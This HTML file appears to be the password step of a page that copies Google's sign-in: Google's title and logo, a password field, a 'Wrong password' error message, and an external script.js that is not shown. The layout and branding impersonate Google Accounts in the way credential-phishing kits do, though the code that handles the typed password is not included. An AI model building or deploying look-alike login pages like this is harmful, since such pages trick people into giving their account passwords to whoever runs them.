<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in - Google Accounts</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" width="120" alt="Google" />
    </div>

    <div class="card">
      <h2>Welcome</h2>
      <p id="emailDisplay"></p>

      <form id="passwordForm">
        <input type="password" id="password" placeholder="Enter your password" required>
        <div id="passError" class="error hidden">Wrong password. Try again or click Forgot password</div>

        <button type="submit">Next</button>
      </form>

      <div class="links">
        <a href="index.html">Use another account</a>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
